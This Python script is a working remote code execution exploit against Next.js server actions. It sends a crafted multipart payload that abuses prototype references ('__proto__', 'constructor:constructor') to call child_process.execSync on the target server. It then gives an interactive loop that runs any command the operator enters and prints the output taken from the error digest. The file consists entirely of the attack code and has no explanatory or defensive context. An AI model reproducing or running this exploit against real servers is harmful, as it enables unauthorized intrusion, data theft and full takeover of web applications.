#!/usr/bin/env python3

import requests
import os
import json

url = os.environ.get("TARGET_URL", "http://localhost:3000/")

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
    "Next-Action": "x",
    "X-Nextjs-Request-Id": "b5dce965",
    "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
}

def build_data(command):
    return (
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        "Content-Disposition: form-data; name=\"0\"\r\n"
        "\r\n"
        "{\n"
        "  \"then\": \"$1:__proto__:then\",\n"
        "  \"status\": \"resolved_model\",\n"
        "  \"reason\": -1,\n"
        "  \"value\": \"{\\\"then\\\":\\\"$B1337\\\"}\",\n"
        "  \"_response\": {\n"
        f"    \"_prefix\": \"var res=process.mainModule.require('child_process').execSync('{command}',{{'timeout':5000}}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});\",\n"
        "    \"_chunks\": \"$Q2\",\n"
        "    \"_formData\": {\n"
        "      \"get\": \"$1:constructor:constructor\"\n"
        "    }\n"
        "  }\n"
        "}\r\n"
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        "Content-Disposition: form-data; name=\"1\"\r\n"
        "\r\n"
        "\"$@0\"\r\n"
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        "Content-Disposition: form-data; name=\"2\"\r\n"
        "\r\n"
        "[]\r\n"
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r\n"
    )

def get_command_output(response_text):
    for line in response_text.splitlines():
        if line.startswith("1:E"):
            json_str = line[3:]
            try:
                data = json.loads(json_str)
                return data.get("digest", "").encode().decode('unicode_escape')
            except Exception:
                return "Failed to parse command output."

def main():
    while True:
        cmd = input("Enter command to execute (or 'exit' to quit): ")
        if cmd.lower() == 'exit':
            raise KeyboardInterrupt
        cmd = cmd.replace("'", "\\'")
        try:
            response = requests.post(url, headers=headers, data=build_data(cmd), timeout=10)
            print(f"\n\n{'-' * 20} COMMAND OUTPUT {'-' * 20}")
            print(get_command_output(response.text))
        except requests.exceptions.Timeout:
            print("Request timed out.")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")
        finally:
            print(f"{'-' * 56}\n\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting...")
